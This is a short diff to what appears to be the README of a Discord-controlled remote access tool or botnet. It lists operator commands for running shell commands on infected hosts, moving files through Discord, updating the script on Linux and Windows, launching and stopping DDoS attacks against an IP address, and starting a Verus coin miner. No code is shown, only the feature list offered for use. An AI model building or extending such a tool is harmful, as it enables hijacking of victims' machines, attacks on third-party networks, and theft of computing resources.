@@ -18,7 +18,8 @@
 * !shell < cmd >                  # Run command
 * !download < link >              # Upload file to Discord
 * !upload < link > < file_name >  # Download file
-* !update < link >                # Update script
+* !sh-update < link >             # Update linux script
+* !win-update < link >            # Update windows script
 * !ddos < ip >                    # Start DDoS Attack
 * !stopddos                       # Stop DDoS Attack
 * !miner < wallet >               # Start Verus coin miner
